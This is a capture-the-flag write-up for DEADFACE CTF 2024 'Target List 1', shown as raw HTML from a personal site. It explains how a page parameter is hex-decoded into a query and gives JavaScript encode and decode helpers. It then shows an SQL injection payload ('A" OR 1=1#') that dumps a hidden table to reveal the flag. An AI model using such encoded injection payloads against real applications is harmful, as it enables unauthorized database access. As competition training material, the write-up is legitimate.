<!DOCTYPE html><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae"/><link rel="stylesheet" href="/_next/static/css/50c8c99451c00ad5.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-50d183473e3f8178.js"/><script src="/_next/static/chunks/4bd1b696-12b3d90ac4ed3802.js" async=""></script><script src="/_next/static/chunks/684-d3c2077e7b7fefb9.js" async=""></script><script src="/_next/static/chunks/main-app-99381da9a4c58049.js" async=""></script><script src="/_next/static/chunks/874-c62c375efd21db20.js" async=""></script><script src="/_next/static/chunks/app/writeups/layout-6eb8da7f54d57912.js" async=""></script><script src="/_next/static/chunks/325-8cc74193b249521f.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js" async=""></script><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd"/><meta name="next-size-adjust" content=""/><title>kevin.fish</title><script>document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))</script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/">← Back to home</a><div><main class="max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-3 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>DEADFACE CTF 2024 — Target List 1</h1>
<blockquote>
<p>Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.</p>
<p>http://targetlist.deadface.io:3001</p>
</blockquote>
<p>We&#x27;re given a simple website that looks like this:</p>
<p><img src="https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c" alt="image"/></p>
<p>On each &quot;page&quot;, we can find records that begin with &quot;A&quot;, &quot;B&quot;, and &quot;C&quot;:</p>
<p><img src="https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4" alt="image"/></p>
<p>At first, it looks like we get to query users that start with</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> page</span><span class="token punctuation">)</span></code></pre></div></div>
<p>where <code class="text-primary bg-black/20 rounded p-1">page</code> is the integer query parameter passed to the page.</p>
<p>If we manually edit the <code class="text-primary bg-black/20 rounded p-1">&amp;page=</code> query parameter to go to page 4, it looks like we can query users beginning with &quot;D&quot; as expected.</p>
<p><img src="https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8" alt="image"/></p>
<p>Similarly, we can query users with &quot;I&quot; on page 9, but somehow the query changes to &quot;II&quot; on page 99, &quot;IÙ&quot; on page 999, and &quot;IÙI&quot; on page 9999:</p>
<p><img src="https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645" alt="image"/></p>
<p>so it looks like our input gets grouped into pairs when parsed. Furthermore, if we go to page <code class="text-primary bg-black/20 rounded p-1">f</code>, we end up querying users starting with &quot;O&quot;; &#x27;A&#x27; + 15.</p>
<p><img src="https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae" alt="image"/></p>
<p>With this, we get a pretty clear picture of how our query parameter is parsed: a 0 is appended to the input, then the page number is interpreted as hex bytes (where 64 is added to each byte so 1 maps to &quot;A&quot;). Then, we can guess our input is handled something like so:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">conv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">const</span><span class=""> chars </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">(</span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">let</span><span class=""> i </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">&lt;</span><span class=""> chars</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">+=</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token keyword">let</span><span class=""> byte </span><span class="token operator">=</span><span class=""> chars</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> chars</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class=""> byte </span><span class="token operator">+=</span><span class=""> chars</span><span class="token punctuation">[</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token keyword">let</span><span class=""> num </span><span class="token operator">=</span><span class=""> </span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="">byte</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> </span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="">num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p><img src="https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5" alt="image"/></p>
<p>But then, when we go to page <code class="text-primary bg-black/20 rounded p-1">162</code>,</p>
<p><img src="https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4" alt="image"/></p>
<p>Why would the cent character cause things to fail? If we go to page <code class="text-primary bg-black/20 rounded p-1">163</code>, something&#x27;s not right; we get &quot;#&quot; instead of &quot;£&quot; as expected:</p>
<p><img src="https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06" alt="image"/></p>
<p>Then, there must be a narrow range of characters where our bytes <em>are</em> subtracted by 128 allowing us to get a wider range of characters. To simplify things, we can assume this range applies to everything above 128 (not true for page <code class="text-primary bg-black/20 rounded p-1">999</code> seen earlier, but the discrepancy is ultimately unimportant to solve the challenge):</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">conv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">const</span><span class=""> rest </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">(</span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">let</span><span class=""> i </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">&lt;</span><span class=""> rest</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">+=</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token keyword">let</span><span class=""> group </span><span class="token operator">=</span><span class=""> rest</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> rest</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class=""> group </span><span class="token operator">+=</span><span class=""> rest</span><span class="token punctuation">[</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token keyword">let</span><span class=""> num </span><span class="token operator">=</span><span class=""> </span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="">group</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">num </span><span class="token operator">&gt;</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">)</span><span class=""> num </span><span class="token operator">-=</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> </span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="">num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p><img src="https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301" alt="image"/></p>
<p>So our input was actually failing on double quotes... could that imply it was being passed to a database as an SQL query? Based on the updated <code class="text-primary bg-black/20 rounded p-1">conv()</code> function, we can write a simple <code class="text-primary bg-black/20 rounded p-1">deconv()</code> function to reverse desired strings to query param bytes:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">deconv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;1&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">const</span><span class=""> c </span><span class="token keyword">of</span><span class=""> s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        </span><span class="token keyword">let</span><span class=""> diff </span><span class="token operator">=</span><span class=""> c</span><span class="token punctuation">.</span><span class="token method function property-access">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class=""> </span><span class="token number">64</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">diff </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> diff </span><span class="token operator">+=</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword">let</span><span class=""> str </span><span class="token operator">=</span><span class=""> diff</span><span class="token punctuation">.</span><span class="token method function property-access">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">str</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> str </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> str</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> str</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>Then, we can run</p>
<p><img src="https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98" alt="image"/></p>
<p>to encode</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">A&quot; OR 1=1#</span></code></pre></div></div>
<p>list the entire table, and get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd" alt="image"/></p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">flag{SQL-1nj3ct10n-thrU-x0r}</span></code></pre></div></div></main></div><!--$--><!--/$--><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-50d183473e3f8178.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-c62c375efd21db20.js\",\"319\",\"static/chunks/app/writeups/layout-6eb8da7f54d57912.js\"],\"\"]\n6:I[59665,[],\"MetadataBoundary\"]\n8:I[59665,[],\"OutletBoundary\"]\nb:I[74911,[],\"AsyncMetadataOutlet\"]\nd:I[59665,[],\"ViewportBoundary\"]\nf:I[26614,[],\"\"]\n:HL[\"/_next/static/media/a34f9d1faa5f3315-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/50c8c99451c00ad5.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"2UVIHC1o6_iywyV4NYPf-\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"7420e657c833bbe586c56a77aabf223d\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"7420e657c833bbe586c56a77aabf223d\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/50c8c99451c00ad5.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to 